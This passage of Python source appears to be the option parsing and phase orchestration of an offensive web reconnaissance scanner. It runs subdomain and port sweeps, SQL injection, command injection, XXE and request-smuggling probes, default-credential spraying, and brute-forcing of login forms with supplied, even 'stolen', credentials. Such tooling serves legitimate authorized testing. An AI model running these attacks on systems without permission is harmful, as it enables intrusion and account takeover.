                    help="skip POST-based probes (XXE, GraphQL batching) of phase 16")
    ap.add_argument("--no-authz", dest="authz", action="store_false",
                    help="skip admin-path auth-bypass header probes, default "
                         "credential checks and auth rate limit checks of phase 16")
    ap.add_argument("--no-tlsscan", dest="tlsscan", action="store_false",
                    help="skip TLS config scan (phase 17)")
    ap.add_argument("--no-sweep", dest="sweep", action="store_false",
                    help="skip org-netblock port sweep (phase 18)")
    ap.add_argument("--sweep-ips", type=int, default=256,
                    help="max IPs sampled from org netblocks (phase 18)")
    ap.add_argument("--sweep-ports", default="21,22,25,80,443,3306,5432,6379,8080,8443,9200,9443",
                    help="ports swept on netblock IPs (phase 18)")
    ap.add_argument("--no-nuclei", dest="nuclei", action="store_false",
                    help="skip nuclei template scan (phase 19)")
    ap.add_argument("--nuclei-sev", default="critical,high,medium",
                    help="nuclei severities to run")
    ap.add_argument("--nuclei-rate", type=int, default=150,
                    help="nuclei requests-per-second rate limit")
    ap.add_argument("--nuclei-timeout", type=int, default=1200,
                    help="hard timeout for the nuclei run (seconds)")
    ap.add_argument("--fail-on", default="", choices=("", "critical", "high",
                                                      "medium", "low"),
                    metavar="{critical,high,medium,low}",
                    help="exit code 2 when any finding is at/above this severity "
                         "(for CI / automation)")
    ap.add_argument("--sarif", action="store_true",
                    help="write SARIF 2.1.0 export (GitHub code scanning)")
    ap.add_argument("--junit", action="store_true",
                    help="write JUnit XML export (CI test gates)")
    ap.add_argument("--csv", action="store_true",
                    help="write findings as CSV (severity,finding)")
    ap.add_argument("--dd-url", default=os.environ.get("DEFECTDOJO_URL", ""),
                    help="DefectDojo base URL - import findings after the scan "
                         "(env DEFECTDOJO_URL)")
    ap.add_argument("--dd-token", default=os.environ.get("DEFECTDOJO_TOKEN", ""),
                    help="DefectDojo API token (env DEFECTDOJO_TOKEN)")
    ap.add_argument("--dd-product", type=int, default=_env_int("DEFECTDOJO_PRODUCT"),
                    help="DefectDojo product id (env DEFECTDOJO_PRODUCT)")
    ap.add_argument("--dd-engagement", type=int,
                    default=_env_int("DEFECTDOJO_ENGAGEMENT"),
                    help="DefectDojo engagement id; 0 creates a new engagement "
                         "(env DEFECTDOJO_ENGAGEMENT)")
    ap.add_argument("--jira-url", default=os.environ.get("JIRA_URL", ""),
                    help="Jira base URL - open issues for findings "
                         "(env JIRA_URL)")
    ap.add_argument("--jira-user", default=os.environ.get("JIRA_USER", ""),
                    help="Jira email/user (env JIRA_USER)")
    ap.add_argument("--jira-token", default=os.environ.get("JIRA_TOKEN", ""),
                    help="Jira API token (env JIRA_TOKEN)")
    ap.add_argument("--jira-project", default=os.environ.get("JIRA_PROJECT", ""),
                    help="Jira project key (env JIRA_PROJECT)")
    ap.add_argument("--jira-limit", type=int, default=50,
                    help="max Jira issues per scan, critical/high first "
                         "(default 50)")
    ap.add_argument("--webhook", default="",
                    help="POST run summary JSON (severity counts + top findings) "
                         "to this URL - best-effort, 10s timeout, TLS verified")
    ap.add_argument("--baseline", default="",
                    help="previous run JSON; write *_diff.txt with new hosts/findings")
    ap.add_argument("--delta", action="store_true",
                    help="auto-baseline: diff against this output's JSON from the last run")
    ap.add_argument("--no-buckets", dest="buckets", action="store_false",
                    help="skip cloud storage bucket enumeration (S3/GCS/Azure)")
    ap.add_argument("--cookie", default="",
                    help='Cookie header for all target requests, e.g. "sid=abc; tok=xyz"')
    ap.add_argument("--cookie-file", default="",
                    help="cookie file: name=value lines or Netscape cookie.txt export")
    ap.add_argument("--authorization", default="",
                    help='Authorization header for all target requests, e.g. "Bearer <token>"')
    ap.add_argument("--header", action="append", default=[],
                    help='extra header "Name: value" for target requests (repeatable)')
    ap.add_argument("--proxy", default="",
                    help="route every HTTP(S) request through a proxy, e.g. "
                         "http://127.0.0.1:8080 or http://user:pass@host:3128 "
                         "(DNS lookups and raw port scans stay direct)")
    ap.add_argument("--no-userenum", dest="userenum", action="store_false",
                    help="skip SMTP VRFY/RCPT mailbox enumeration "
                         "(evidence: control-vs-candidate reply differential)")
    ap.add_argument("--no-putdel", dest="putdel", action="store_false",
                    help="skip unauthenticated canary write checks "
                         "(PUT-ALLOWED/DELETE-ALLOWED on hosts, "
                         "BUCKET-WRITE on discovered buckets)")
    ap.add_argument("--no-smtp", dest="smtp", action="store_false",
                    help="skip active MX checks (open-relay test + "
                         "STARTTLS presence/health on the primary exchanger)")
    ap.add_argument("--no-mailsec", dest="mailsec", action="store_false",
                    help="skip CAA + MTA-STS DNS hardening checks "
                         "(CAA-MISSING/MTA-STS-MISSING findings)")
    ap.add_argument("--no-nsecwalk", dest="nsecwalk", action="store_false",
                    help="skip DNSSEC NSEC zone-walk (NSEC-WALK findings)")
    ap.add_argument("--no-ws", dest="ws", action="store_false",
                    help="skip websocket endpoint discovery/connect scan")
    ap.add_argument("--no-smuggle", dest="smuggle", action="store_false",
                    help="skip HTTP request-smuggling timing probes")
    ap.add_argument("--auth-b", default="", dest="auth_b",
                    help='second account "Header: value" - enables IDOR/bOLA matrix '
                         'against objects both accounts can read')
    ap.add_argument("--creds", action="append", default=[], metavar="USER:PASS",
                    help='known/stolen credential "user:pass" to brute against '
                         'discovered login forms (repeatable) - lockout-safe, '
                         'random-credential control required -> SPRAY-KNOWN')
    ap.add_argument("--creds-file", default="", metavar="FILE",
                    help="file of user:pass lines (one per line, # comments) "
                         "bruteforced against discovered login forms")
    ap.add_argument("--brute-user", action="append", default=[], metavar="USER",
                    help="username combined with --brute-pass into a cross-"
                         "product credential set (repeatable)")
    ap.add_argument("--brute-pass", action="append", default=[], metavar="PASS",
                    help="password combined with --brute-user into a cross-"
                         "product credential set (repeatable)")
    ap.add_argument("--web", nargs="?", const=80, type=int, default=None,
                    metavar="PORT",
                    help="start the local browser dashboard (default: port 80 "
                         "so it opens as http://subenum; falls back to 8080+ "
                         "when taken) - this is also what a bare "
                         "'python subenum.py' launches; positional targets are "
                         "ignored in web mode")
    ap.add_argument("--cli", action="store_true",
                    help="use the interactive console prompt (target + profile) "
                         "instead of the browser dashboard when run with no "
                         "targets")
    ap.add_argument("--no-browser", dest="no_browser", action="store_true",
                    help="do not auto-open the dashboard in the default browser")
    ap.set_defaults(probe=True, dns=True, wayback=True, secrets=True, portscan=True,
                    takeover=True, mine=True, files=True, axfr=True, wildfilter=True,
                    dirs=True, vhost=True, api=True, methods=True, cve=True,
                    reverse=True, asn=True, params=True, tlsscan=True,
                    sweep=True, nuclei=True, buckets=True, ws=True, smuggle=True,
                    sqli=True, cmdi=True, xxe=True, authz=True, userenum=True,
                    putdel=True, mailsec=True, nsecwalk=True, smtp=True)
    a = ap.parse_args()
    if a.web is not None and a.web <= 0:
        ap.error("--web PORT must be > 0")
    global PROXY
    PROXY = (a.proxy or "").strip()
    if PROXY and not re.match(r"^https?://", PROXY, re.I):
        print("[!] --proxy only accepts http:// or https:// URLs "
              "(DNS lookups and raw port scans stay direct)", flush=True)
        sys.exit(2)
    if a.clear_data:
        n = _clear_old_data(os.path.splitext(a.out)[0] or "subdomains")
        if not (a.targets or a.targets_csv):
            print(f"[+] --clear-data: {n} old data file(s) removed",
                  flush=True)
            sys.exit(0)
        print(f"[+] --clear-data: {n} old data file(s) removed, "
              f"scanning fresh", flush=True)
    if a.web:
        return await run_webui(int(a.web), open_browser=not a.no_browser,
                               fallback=(a.web in (80, 8080)))
    if not a.targets and not a.targets_csv:
        # zero-arg default: browser dashboard (type the target in the UI and
        # watch live phase progress). --cli / --resume / piped stdin keep the
        # console prompt
        if sys.stdin.isatty() and not a.cli and not a.resume:
            return await run_webui(80, open_browser=not a.no_browser,
                                   fallback=True)
        interactive_launch(a)
    cookie_text = ""
    if a.cookie_file:
        try:
            with open(a.cookie_file, encoding="utf-8", errors="ignore") as cf:
                cookie_text = cf.read()
        except OSError as e:
            print(f"[!] cookie file unreadable: {e}", flush=True)
    AUTH_HEADERS.clear()
    AUTH_HEADERS.update(build_auth(a.cookie, cookie_text, a.authorization, a.header))
    if AUTH_HEADERS:
        print(f"[+] auth on target requests: {', '.join(sorted(AUTH_HEADERS))}",
              flush=True)
    setup_resolver(a.resolver, a.nameservers)
    set_concurrency(a.dns_conc, a.http_conc, a.port_conc)
    plist = tuple(int(x) for x in re.split(r"[,\s]+", a.ports or "") if x.isdigit()) or DEFAULT_PORTS
    sweep_ports = tuple(int(x) for x in re.split(r"[,\s]+", a.sweep_ports or "")
                        if x.isdigit()) or (22, 80, 443, 8080, 8443)
    pages = 0 if a.crawl_off else max(0, a.crawl_n)
    statefile = a.state or (os.path.splitext(a.out)[0] + ".state.json")
    base, ext = (os.path.splitext(a.out)[0] or "subdomains",
                 os.path.splitext(a.out)[1] or ".txt")
    findfile = base + "_findings" + ext

    domains = parse_targets(a.targets, a.targets_csv)
    t0 = time.time()
    findings, mined = Findings(), {}
    scripts_by_host = {}
    certs = {}
    surf = {}
    attrib, crawl_rows, all_paths = {}, [], set()
    port_results, wb_paths, wb_attr = [], [], {}
    dir_rows, vhost_rows, api_rows, method_rows = [], [], [], []
    surfinfo = {}
    cname, apex, chains, dangling = {}, {}, {}, {}
    probes = {}
    live = {}
    netblocks = set()
    brute_all, evidence, wc_zones = set(), set(), {}
    start = 1
    dir_paths = list(DIR_PATHS)
    if a.dirwl and os.path.exists(a.dirwl):
        with open(a.dirwl, encoding="utf-8", errors="ignore") as f:
            for line in f:
                w = line.strip().lstrip("/")
                if w and re.fullmatch(r"[A-Za-z0-9._~\-/]{1,120}", w) and w not in dir_paths:
                    dir_paths.append(w)
    vw = load_words(a.wl, 500)
    print(f"[*] targets: {', '.join(domains)}", flush=True)
    if WEB_BUS.active:
        WEB_BUS.attach({
            "subs": lambda: len(live),
            "endpoints": lambda: len(all_paths),
            "ports": lambda: len(port_results),
            "dirs": lambda: len(dir_rows),
            "vhosts": lambda: len(vhost_rows),
        }, sevsrc=lambda: findings)

    # ---------------- resume ----------------
    if a.resume and os.path.exists(statefile):
        try:
            with open(statefile, encoding="utf-8") as fh:
                upd = parse_state(json.load(fh), domains)
            if upd is None:
                print("[*] state file is for different targets - starting fresh",
                      flush=True)
            else:
                live = upd.pop("live", live)
                findings = Findings(upd.pop("findings", findings))
                apex = upd.pop("apex", apex)
                brute_all = upd.pop("brute_all", brute_all)
                evidence = upd.pop("evidence", evidence)
                wc_zones = upd.pop("wc_zones", wc_zones)
                cname = upd.pop("cname", cname)
                chains = upd.pop("chains", chains)
                dangling = upd.pop("dangling", dangling)
                surf = upd.pop("surf", surf)
                netblocks = upd.pop("netblocks", netblocks)
                probes = upd.pop("probes", probes)
                if "certs" in upd:
                    certs = upd.pop("certs")   # phase-4 data: keeps TLS-config
                if "port_results" in upd:      # findings alive across resume
                    port_results = upd.pop("port_results")
                    dir_rows = upd.pop("dir_rows")
                    vhost_rows = upd.pop("vhost_rows")
                    api_rows = upd.pop("api_rows")
                    method_rows = upd.pop("method_rows")
                    attrib = upd.pop("attrib")
                    all_paths = upd.pop("all_paths")
                    mined = upd.pop("mined", mined)
                    scripts_by_host = upd.pop("scripts_by_host", scripts_by_host)
                    crawl_rows = upd.pop("crawl_rows")
                    surfinfo = upd.pop("surfinfo")
                start = upd.pop("start", 1)    # set last: never half-resume
            if start > 1:
                print(f"[*] resume from stage {start - 1} "
                      f"({len(live)} hosts, {len(findings)} findings)", flush=True)
        except Exception as e:
            note_check_error("state", f"resume failed: {e}")

    stop_flush = [False]
    flush_task = asyncio.create_task(
        findings_flusher(findings, findfile, stop_flush))

    def save_state(stage, with_probes=False):
        try:
            st = {"stage": stage, "targets": domains, "live": live,
                  "findings": findings, "cname": cname,
                  "chains": chains, "dangling": dangling, "apex": apex, "surf": surf,
                  "brute_all": sorted(brute_all), "evidence": sorted(evidence),
                  "wc_zones": wc_zones, "netblocks": sorted(netblocks),
                  "certs": certs}
            if with_probes:
                # cap per-body bytes in the checkpoint: base64-encoding every
                # full probe body into one json blob balloons memory/disk (a
                # large host set x 64KB bodies). keep small bodies, drop the
                # big ones - a resumed scan re-probes a host whose body was
                # dropped rather than OOM'ing on load.
                _BODY_CAP = 8192
                ser = {}
                for h, i in probes.items():
                    d = dict(i)
                    b = d.pop("body", b"")
                    if b and len(b) > _BODY_CAP:
                        b = b""
                    d["body64"] = base64.b64encode(b).decode() if b else ""
                    ser[h] = d
                st["probes"] = ser
            if stage >= 15:
                st["port_results"] = [list(r) for r in port_results]
                st["dir_rows"] = dir_rows
                st["vhost_rows"] = vhost_rows
                st["api_rows"] = api_rows
                st["method_rows"] = method_rows
                st["attrib"] = {p: sorted(hs) for p, hs in attrib.items()}
                st["all_paths"] = sorted(all_paths)
                st["mined"] = {h: sorted(ps) for h, ps in mined.items()}
                st["scripts_by_host"] = {h: sorted(v) for h, v
                                         in scripts_by_host.items()}
                st["crawl_rows"] = crawl_rows
                st["surfinfo"] = surfinfo
            write_state(statefile, st)
        except Exception as e:
            note_check_error("state", f"save failed: {e}")

    # ---------------- phases 1-3 ----------------
    if start <= 3:
        print("[1/19] passive OSINT ...", flush=True)
        passive_hosts = await passive(domains)
        print(f"      -> {len(passive_hosts)} candidates ({time.time()-t0:.1f}s)", flush=True)
        evidence |= passive_hosts

        pre = list(domains)
        if not a.nobrute:
            pre += [f"{z}.{d}" for d in domains for z in PARENT_ZONES]
        pre += wc_zone_candidates(passive_hosts, domains, min_kids=3)
        wc_zones = await detect_wildcards(pre, domains)

        brute_hosts, dns_failed = set(), set()
        if not a.nobrute:
            words = load_words(a.wl, a.max)
            names = set()
            for d in domains:
                for w in words:
                    names.add(f"{w}.{d}")
                for z in PARENT_ZONES:
                    for w in words[:800]:
                        names.add(f"{w}.{z}.{d}")
            names -= passive_hosts
            print(f"[2/19] DNS brute: {len(names)} names ...", flush=True)
            t1 = time.time()
            brute_hosts = set(await resolve_all(names, "brute", dns_failed, True))
            m_all = mutate_labels(passive_hosts | brute_hosts, domains)
            m_all -= passive_hosts | brute_hosts
            muts = m_all
            if a.wildfilter and wc_zones:
                muts = {m for m in m_all
                        if not any(m.endswith("." + d) and d in wc_zones for d in domains)}
                if len(muts) < len(m_all):
                    print(f"      (mutation {len(m_all)} -> {len(muts)}: "
                          f"wildcard zones skipped)", flush=True)
            if muts:
                print(f"      + {len(muts)} label permutations ...", flush=True)
                mut_live = await resolve_all(muts, "mutate", dns_failed, True)
                brute_hosts |= set(mut_live)
            print(f"      -> {len(brute_hosts)} live ({time.time()-t1:.1f}s)", flush=True)
            brute_all |= brute_hosts

        allc = passive_hosts | brute_hosts | dns_failed
        print(f"[3/19] verify {len(allc)} candidates ...", flush=True)
        live = await resolve_all(allc, "verify", dns_failed)
        if dns_failed:
            await asyncio.sleep(2.5)      # let endpoint cooldowns clear
            print(f"      retrying {len(dns_failed)} unresolved hosts ...", flush=True)
            live.update(await resolve_all(dns_failed, "retry"))
        more = await detect_wildcards(wc_zone_candidates(live, domains), domains,
                                      already=wc_zones)
        wc_zones.update(more)
        if not a.probe:
            n = await wildcard_filter(live, None, wc_zones, brute_all, evidence,
                                      findings, enabled=a.wildfilter)
            if n:
                print(f"      -> {n} wildcard fillers removed (IP match)", flush=True)
        save_state(3)

    # ---------------- phase 4 ----------------
    if a.dns and start <= 5:
        print(f"[4/19] dns + tls for {len(live)} hosts ...", flush=True)
        cname, apex, chains, dangling = await dns_records(domains, live, findings)
        if dangling:
            print(f"      -> {len(dangling)} dangling CNAMEs", flush=True)
        rec_hosts = record_subdomains(apex, domains)
        if rec_hosts:
            new_rec = rec_hosts - set(live)
            print(f"      record-derived names: {len(rec_hosts)}"
                  + (f" ({len(new_rec)} to verify)" if new_rec else ""), flush=True)
            if new_rec:
                live.update(await resolve_all(new_rec, "records"))
            evidence |= rec_hosts
        axfr_hosts = await axfr_check(domains, apex, findings, a.axfr)
        if axfr_hosts:
            new_ax = axfr_hosts - set(live)
            if new_ax:
                live.update(await resolve_all(new_ax, "axfr"))
            evidence |= axfr_hosts
        certs, newc = await tls_batch(sorted(live), findings, domains)
        if newc:
            print(f"      verifying {len(newc)} TLS-SAN names ...", flush=True)
            live.update(await resolve_all(newc, "san"))
            evidence |= newc
    elif start <= 5:
        certs = {}          # start >= 6 keeps certs restored from the checkpoint

    # ---------------- phase 4b: reverse + netblock ----------------
    if a.reverse and start <= 5 and live:
        print(f"[4b/19] reverse DNS + netblock expansion ({len(live)} hosts) ...",
              flush=True)
        rev = await reverse_expand(live, domains, budget=a.ptr_budget,
                                   asn_expand=a.asn, netblocks=netblocks)
        if netblocks:
            print(f"      org netblocks: {len(netblocks)} prefixes "
                  f"(phase 18 sweep)", flush=True)
        if rev:
            new_rev = rev - set(live)
            if new_rev:
                print(f"      verifying {len(new_rev)} reverse-derived names ...",
                      flush=True)
                live.update(await resolve_all(new_rev, "reverse"))
            evidence |= rev

    # ---------------- phase 5 ----------------
    if a.probe and start <= 5:
        print(f"[5/19] http probe on {len(live)} hosts ...", flush=True)
        probes = await probe_all(sorted(live), findings)
        miss = [h for h, i in probes.items() if not i.get("status")]
        if miss:
            print(f"      retry {len(miss)} unreachable hosts ...", flush=True)
            again = await probe_all(miss, findings)
            probes.update({h: i for h, i in again.items() if i.get("status")})
        await wildcard_filter(live, probes, wc_zones, brute_all, evidence, findings,
                              enabled=a.wildfilter)
        token_url_scan(probes, findings)
        # parallelize the independent per-app scanners (was a serial chain)
        await asyncio.gather(
            jenkins_rce(probes, findings),
            jenkins_default(probes, findings),
            grafana_scan(probes, findings),
            jupyter_scan(probes, findings),
            airflow_scan(probes, findings),
            wp_enum(probes, findings),
            return_exceptions=True)
        save_state(5, with_probes=True)

    # ---------------- phases 6/7/8 parallel ----------------
    if start <= 15:
        s68 = (["crawl+checks"] if probes else []) + \
              (["ports"] if a.portscan and live else []) + \
              (["wayback"] if a.wayback else [])
        if s68:
            print(f"[6-8/19] {' | '.join(s68)} (parallel) ...", flush=True)
        else:
            print("[6-8/19] skipped: crawl/ports/wayback off or no hosts",
                  flush=True)
        tasks, keys = [], []
        if probes:
            tasks.append(deep_crawl(probes, findings, mined if a.mine else None,
                                    scripts_by_host,
                                    pages, surf))
            keys.append("crawl")
        if a.portscan and live:
            tasks.append(port_scan(sorted(live), plist, findings))
            keys.append("ports")
        if a.wayback:
            tasks.append(wayback_paths(domains))
            keys.append("wayback")
        port_results, wb_paths, wb_attr = [], [], {}
        if tasks:
            res = await asyncio.gather(*tasks, return_exceptions=True)
            for k, r in zip(keys, res):
                if isinstance(r, BaseException):
                    note_check_error(k, f"failed: {r}")
                    continue
                if k == "ports":
                    port_results = r
                elif k == "wayback":
                    wb_paths, wb_attr = r

    # ---------------- phase 9 ----------------
    # a.files (file leaks) is NOT a secret scan: it must run even with
    # --no-secrets (it used to be nested under the a.secrets gate, so
    # `--files --no-secrets` silently scanned nothing)
    if start <= 15 and probes and (a.secrets or a.files):
        # any answered page (401/403/301/500 too) can leak secrets and holds
        # files to probe - only an unanswered (None/0) probe is skipped
        ok = [h for h, i in probes.items() if i.get("status")][:a.max_scan]
        what = ("secret scan + file leaks" if a.secrets and a.files
                else "secret scan" if a.secrets else "file leak check")
        print(f"[9/19] {what} on {len(ok)} pages ...", flush=True)
        budget = [800]
        conn = aiohttp.TCPConnector(limit=0, ssl=False)
        async with tsession(conn) as s, xsession(conn) as s2:
            if a.secrets:
                r9 = await asyncio.gather(
                    *[scan_host(s, h, probes[h], findings, budget,
                                mined if a.mine else None,
                                scripts_by_host.get(h, ()), surf)
                      for h in ok],
                    return_exceptions=True)
                nf = sum(1 for x in r9 if isinstance(x, BaseException))
                if nf:
                    print(f"  [secrets] {nf} host scan(s) raised and were skipped",
                          flush=True)
                if a.wayback:
                    wjs = await wayback_js(domains)
                    sem = asyncio.Semaphore(8)
                    blobs = await asyncio.gather(
                        *[fetch_blob(s2, "https://web.archive.org/web/0id_/" + u, 25, sem)
                          for u in wjs],
                        return_exceptions=True)
                    got = 0
                    for u, data in zip(wjs, blobs):
                        if not data or isinstance(data, BaseException):
                            continue
                        wh = urlsplit(u).netloc.lower().split(":")[0] or "wayback"
                        scan_blob(wh, u, data, findings, surf)
                        if a.mine:
                            mine(wh, data, mined)
                        got += 1
                    print(f"      + {got}/{len(wjs)} archived JS snapshots scanned", flush=True)
                if FIREBASE_DBS or FIREBASE_BUCKETS:
                    await firebase_scan(s, findings)
                r9p = await asyncio.gather(
                    *[wp_plugin_ver(s, h, findings) for h in ok],
                    return_exceptions=True)
                npv = sum(1 for x in r9p if isinstance(x, BaseException))
                if npv:
                    print(f"  [wpver] {npv} host(s) raised and were skipped",
                          flush=True)
            if a.files:
                r9f = await asyncio.gather(
                    *[file_leaks(s, h, findings) for h in ok],
                    return_exceptions=True)
                nff = sum(1 for x in r9f if isinstance(x, BaseException))
                if nff:
                    print(f"  [files] {nff} host leak scan(s) raised and were skipped",
                          flush=True)
    elif start <= 15:
        print("[9/19] secret/file scan skipped (flags off or no pages)", flush=True)

    # ---------------- phase 10 ----------------
    if start <= 15 and a.takeover:
        print(f"[10/19] takeover check: {len(dangling)} dangling CNAMEs ...", flush=True)
        if dangling:
            await takeover_confirm(dangling, probes, findings)
    elif start <= 15:
        print("[10/19] takeover check skipped (--no-takeover)", flush=True)

    # ---------------- phases 11/12/13/14 parallel ----------------
    if start <= 15:
        live_http = [h for h in sorted(probes) if probes[h].get("status")]
        dir_rows, vhost_rows, api_rows, method_rows = [], [], [], []
        # waves 21/20/22 read attrib/crawl_rows - assemble them here (after
        # phase 11-14 mining, before the waves) so a fresh run never reads
        # an unbound cell (was a latent UnboundLocalError crash).
        all_paths = set(wb_paths)
        attrib = {p: set(hs) for p, hs in wb_attr.items()}
        if a.mine:
            for h, ps in mined.items():
                all_paths |= ps
                for p in ps:
                    attrib.setdefault(p, set()).add(h)
            if probes:
                sm = await sitemap_paths(probes)
                for p, hs in sm.items():
                    all_paths.add(p)
                    attrib.setdefault(p, set()).update(hs)
        crawl_rows = sorted(f"{h}\t{p}" for p, hs in attrib.items() for h in hs)
        tasks2, keys2 = [], []
        if a.dirs and live_http:
            tasks2.append(content_discovery(probes, findings, dir_paths))
            keys2.append("dirs")
        if a.vhost and live:
            tasks2.append(vhost_brute(probes, live, domains, vw, findings))
            keys2.append("vhost")
        if a.api and live_http:
            tasks2.append(api_spec(probes, findings, schema_out=base + "_graphql.txt"))
            keys2.append("api")
            tasks2.append(llm_surface_checks(probes, findings))
            keys2.append("llm")
        if a.methods and live_http:
            tasks2.append(method_matrix(probes, findings))
            keys2.append("methods")
        if tasks2:
            print(f"[11-14/19] dirs | vhost | api-spec | llm | methods "
                  f"({len(live_http)} hosts) ...", flush=True)
            res = await asyncio.gather(*tasks2, return_exceptions=True)
            for k, r in zip(keys2, res):
                if isinstance(r, BaseException):
                    note_check_error(k, f"failed: {r}")
                    continue
                if k == "dirs":
                    dir_rows = r
                elif k == "vhost":
                    vhost_rows = r
                elif k == "api":
                    api_rows = r
                elif k == "llm":
                    llm_rows = r
                else:
                    method_rows = r
        else:
            print("[11-14/19] skipped: dirs/vhost/api-spec/methods all off",
                  flush=True)

    # ---------------- waves 21/20/22: advanced + mass-assign + biz logic ----------------
    # previously three sequential asyncio.gather barriers (21 -> 20 -> 22);
    # merged into one gather so ~25 independent check families overlap.
    # checks take their connector as an arg; they share only the append-only
    # findings list, so a single shared connector is safe.
    if start <= 15 and live_http:
        connw = aiohttp.TCPConnector(limit=0, ssl=False)
        tasks21, tasks3, tasks22 = [], [], []
        if a.params or a.methods:
            tasks21.append(("h2desync", h2_desync_scan(connw, probes, findings)))
            tasks21.append(("h3down", h3_downgrade_check(connw, probes, findings)))
            tasks21.append(("wssmug", ws_frame_smuggle(connw, probes, findings)))
            tasks21.append(("downgrade", downgrade_check(connw, probes, attrib, findings)))
        if a.methods:
            tasks21.append(("davx", dav_method_checks(connw, probes, findings)))
        if a.api or a.params:
            tasks21.append(("csrf", csrf_state_check(connw, probes, attrib, findings)))
            tasks21.append(("methodbyp", method_override_bypass(connw, probes, findings)))
            tasks21.append(("bulk", bulk_exposure_check(connw, probes, crawl_rows, findings)))
        if a.authz or a.api:
            tasks21.append(("bola", bola_sweep(connw, probes, crawl_rows, findings,
                                                 getattr(a, "auth_b", ""))))
        if a.secrets:
            tasks21.append(("atochain", ato_chain_check(connw, probes, findings)))
        if a.params or not a.nobrute:
            tasks21.append(("sessfix", session_fixation_check(connw, probes, findings)))
            tasks21.append(("sessrot", session_rotation_check(connw, probes, findings)))
            tasks21.append(("deser", deser_probe(connw, probes, attrib, findings)))
            tasks21.append(("race", race_condition_check(connw, probes, attrib, findings)))
            tasks21.append(("sstic", ssti_confirm_check(connw, probes, attrib, findings)))
            tasks21.append(("protosink", proto_pollution_sink(connw, probes, attrib, findings)))
        if a.mine or a.params:
            tasks21.append(("jstakeover", js_subdomain_takeover(connw, probes, findings)))
            tasks21.append(("postmsg", postmessage_origin_check(connw, probes, findings)))
        if a.api:
            tasks3.append(("massassign", mass_assign_scan(connw, probes, findings)))
        if a.secrets:
            tasks3.append(("spray", spray_default(connw, probes, findings)))
        _pairs = load_cred_pairs(
            pairs=getattr(a, "creds", None),
            users=getattr(a, "brute_user", None),
            pwds=getattr(a, "brute_pass", None),
            cred_file=getattr(a, "creds_file", ""))
        if a.secrets and _pairs:
            tasks22.append(("sprayknown",
                            spray_known(connw, probes, findings, _pairs)))
        if a.api:
            tasks22.append(("bizprice", biz_price_check(connw, probes, findings)))
            tasks22.append(("bizcoupon", biz_coupon_check(connw, probes, findings)))
            tasks22.append(("bizflow", biz_workflow_check(connw, probes, findings)))
            tasks22.append(("bizquota", biz_quota_check(connw, probes, findings)))
        if tasks21:
            print(f"[12c/19] advanced protocol/session/auth/logic/supply-chain "
                  f"({len(live_http)} hosts) ...", flush=True)
        if tasks3:
            print(f"[12b/19] mass-assign + default-cred spray "
                  f"({len(live_http)} hosts) ...", flush=True)
        if tasks22:
            print(f"[12d/19] known-cred brute + business logic "
                  f"({len(live_http)} hosts) ...", flush=True)
        allwave = tasks21 + tasks3 + tasks22
        if allwave:
            rw = await asyncio.gather(*[t for _k, t in allwave],
                                      return_exceptions=True)
            for (k, _t), r in zip(allwave, rw):
                if isinstance(r, BaseException):
                    note_check_error(k, f"failed: {r}")
        if a.portscan and port_results:
            up_hosts = sorted({h for h, p, _b in port_results if p in (5672, 6379, 11211)})
            up_hosts = up_hosts or sorted(live_http)
            try:
                await udp_service_checks(up_hosts, findings)
            except Exception as ue:
                note_check_error("udp", f"failed: {ue}")

    # endpoints (all_paths/attrib/crawl_rows) are assembled in the phase
    # 11-14 block above so waves 20-22 can consume them.
    mined_n = sum(len(ps) for ps in mined.values())

    # ---------------- phase 15 ----------------
    if start <= 15:
        print("[15/19] surface harvest + CVE/EOL/CDN analysis ...", flush=True)
        if a.mailsec and domains:
            await dns_hardening_checks(domains, findings)
        if a.nsecwalk and domains:
            await nsec_zone_walk(domains, findings)
        surfinfo = await surface_cve(probes, surf, all_paths, port_results,
                                     scripts_by_host, findings, do_cve=a.cve)
        save_state(15, with_probes=True)
    cdn = surfinfo["cdn"]

    # ---------------- active scanning: phases 16-18 (parallel) ----------------
    tasks2, keys2 = [], []
    if a.params and probes:
        tasks2.append(param_attacks(probes, attrib, findings, a.attack_budget,
                                    sqli=a.sqli, cmdi=a.cmdi,
                                    xxe=a.xxe, authz=a.authz))
        keys2.append("params")
        tasks2.append(login_enum(probes, findings))
        keys2.append("loginenum")
        if attrib:
            tasks2.append(hpp_check(probes, attrib, findings))
            keys2.append("hpp")
            tasks2.append(email_inject(probes, attrib, findings))
            keys2.append("emailinj")
            tasks2.append(idor_probe(probes, attrib, findings))
            keys2.append("idorprobe")
            tasks2.append(redos_check(probes, attrib, findings))
            keys2.append("redos")
        tasks2.append(oauth_redirect_check(probes, findings))
        keys2.append("oauth")
    if a.tlsscan and live:
        tasks2.append(tls_config_scan(live, probes, certs, port_results, findings))
        keys2.append("tls-config")
    if a.sweep and live and netblocks:
        tasks2.append(netblock_sweep(netblocks, live, domains, findings,
                                     sweep_ports, a.sweep_ips))
        keys2.append("sweep")
    if a.buckets and (domains or probes):
        tasks2.append(bucket_enum(domains, probes, findings,
                                  do_write=a.putdel))
        keys2.append("buckets")
    if a.ws and probes:
        tasks2.append(websocket_scan(probes, findings))
        keys2.append("ws")
    if a.portscan and port_results:
        tasks2.append(ftp_anon_scan(port_results, findings))
        keys2.append("ftp")
        tasks2.append(svc_probe(port_results, findings))
        keys2.append("svc")
    if a.smuggle and probes:
        tasks2.append(smuggle_scan(probes, findings))
        keys2.append("smuggle")
    if a.params and probes:          # unkeyed-header poisoning is active
        tasks2.append(cache_poison(probes, findings))   # param-style probing
        keys2.append("cache")
    if a.auth_b and crawl_rows:
        tasks2.append(idor_matrix(probes, crawl_rows, findings, a.auth_b))
        keys2.append("idor")
    if a.authz and probes and (dir_rows or any(i.get("status") == 401
                                               for i in probes.values())):
        tasks2.append(basic_auth_scan(probes, dir_rows, findings))
        keys2.append("basic-auth")
    if a.authz and probes and attrib:
        tasks2.append(ratelimit_check(probes, attrib, findings))
        keys2.append("ratelimit")
    if a.files and probes and (dir_rows or attrib):
        bpairs = [(r.split("\t")[0], r.split("\t")[3]) for r in dir_rows
                  if len(r.split("\t")) == 4]
        bpairs += [(h, p) for p, hs in attrib.items() for h in hs]
        tasks2.append(backup_scan(probes, bpairs, findings))
        keys2.append("backup")
    if a.userenum and domains and surf:
        tasks2.append(user_enum(domains, findings, surf))
        keys2.append("userenum")
    if a.putdel and probes:
        tasks2.append(put_delete_checks(probes, findings))
        keys2.append("putdel")
    if a.smtp and domains:
        tasks2.append(smtp_checks(domains, findings))
        keys2.append("smtpchecks")
    if tasks2:
        print(f"[16-18/19] {' | '.join(keys2)} (parallel) ...", flush=True)
